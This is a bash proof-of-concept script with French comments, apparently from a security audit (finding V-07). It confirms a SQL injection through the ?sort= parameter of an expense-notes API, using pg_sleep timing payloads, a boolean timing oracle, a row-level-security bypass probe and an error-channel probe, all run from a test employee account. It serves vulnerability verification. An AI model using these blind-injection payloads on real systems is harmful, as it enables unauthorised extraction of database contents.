#!/usr/bin/env bash
# V-07 — Injection SQL via le paramètre ?sort= de GET /api/expense-notes.
# Le paramètre est concaté dans "ORDER BY ${sort}" (route.ts:42,46).
# On teste depuis un compte employé authentifié de test.
#
# Canaux d'observation testés :
#  1. temporel (pg_sleep) : résultat d'une sous-requête observable à l'aveugle
#  2. booléen temporel : oracle vrai/faux -> extraction de données arbitraires
#  3. lecture au-delà du périmètre de l'employé (RLS contournée, cf. V-05)
#  4. message d'erreur : NON observable ici (voir note finale)
set -u
cd "$(dirname "$0")"; . ./_lib.sh
require_app

DOMAIN="poc-v-07.test"
EMP_ID="$(ensure_test_user "emp@$DOMAIN" "poc07pass" "employee" "$DOMAIN")"
TOK="$(applogin "emp@$DOMAIN" "poc07pass")"
[ -n "$TOK" ] || fail2 "login de l'employé de test a échoué"
C="authjs.session-token=$TOK"
# L'employé doit posséder >=2 notes pour que ORDER BY évalue la clé de tri.
png_fixture "$WORK/px.png"
for i in 1 2; do
  curl -s -o /dev/null -b "$C" -X POST "$BASE_URL/api/expense-notes" \
    -F "amount=$i.00" -F "expenseDate=2026-03-0$i" -F "description=poc07-$i" \
    -F "receipt=@$WORK/px.png;type=image/png"
done

enc() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$1"; }
timed() { # <sort-expr> -> imprime le temps total en secondes
  local q; q="$(enc "$1")"
  curl -s -b "$C" "$BASE_URL/api/expense-notes?sort=$q" -o /dev/null -w '%{time_total}'
}

echo "== 0. baseline (tri par défaut) =="
T_BASE="$(timed 'created_at DESC')"; note "baseline = ${T_BASE}s"

echo "== 1. temporel : ORDER BY (SELECT 1 FROM pg_sleep(2)) =="
T_SLEEP="$(timed '(SELECT 1 FROM pg_sleep(2))')"; note "pg_sleep(2) = ${T_SLEEP}s"

echo "== 2. oracle booléen (users existent) : VRAI => sleep 2, FAUX => sleep 0 =="
T_TRUE="$(timed '(SELECT 1 FROM pg_sleep(CASE WHEN (SELECT count(*) FROM users)>0 THEN 2 ELSE 0 END))')"
T_FALSE="$(timed '(SELECT 1 FROM pg_sleep(CASE WHEN (SELECT count(*) FROM users)>100000 THEN 2 ELSE 0 END))')"
note "oracle VRAI = ${T_TRUE}s ; oracle FAUX = ${T_FALSE}s"

echo "== 3. lecture hors périmètre (RLS contournée) : la sous-requête voit"
echo "       TOUTES les notes alors que l'employé n'en possède que 2 =="
TOTAL="$(pq "SELECT count(*) FROM expense_notes;")"
T_ALL="$(timed "(SELECT 1 FROM pg_sleep(CASE WHEN (SELECT count(*) FROM expense_notes)>2 THEN 2 ELSE 0 END))")"
note "notes totales en base = $TOTAL ; oracle 'total>2' = ${T_ALL}s"

echo "== 4. canal message d'erreur =="
BODY="$(curl -s -b "$C" "$BASE_URL/api/expense-notes?sort=$(enc '(SELECT CAST(email AS int) FROM users LIMIT 1)')" -w '%{http_code}')"
note "réponse = $BODY"
echo "   -> GET /api/expense-notes fait 'return withUserScope(...)' sans await :"
echo "      l'exception ne passe pas par respondError (V-11), corps 500 vide."
echo "      L'exfiltration est donc à l'AVEUGLE (temporel/booléen), pas par erreur."

# Verdict : l'injection est prouvée si pg_sleep rallonge la réponse et si
# l'oracle booléen discrimine vrai/faux de façon nette.
GE=$(awk -v a="$T_SLEEP" -v b="$T_BASE" 'BEGIN{print (a-b>1.5)?1:0}')
GO=$(awk -v a="$T_TRUE" -v b="$T_FALSE" 'BEGIN{print (a-b>1.5)?1:0}')
GA=$(awk -v a="$T_ALL" -v b="$T_FALSE" 'BEGIN{print (a-b>1.5)?1:0}')

echo
if [ "$GE" = "1" ] && [ "$GO" = "1" ] && [ "$GA" = "1" ]; then
  echo "=> Sous-expression SQL arbitraire évaluée et observable à l'aveugle ;"
  echo "   lecture confirmée au-delà des lignes de l'employé (RLS contournée)."
  verdict CONFIRMÉ
else
  echo "=> Signal temporel insuffisant (machine chargée ?). Relancer."
  verdict PARTIEL
fi
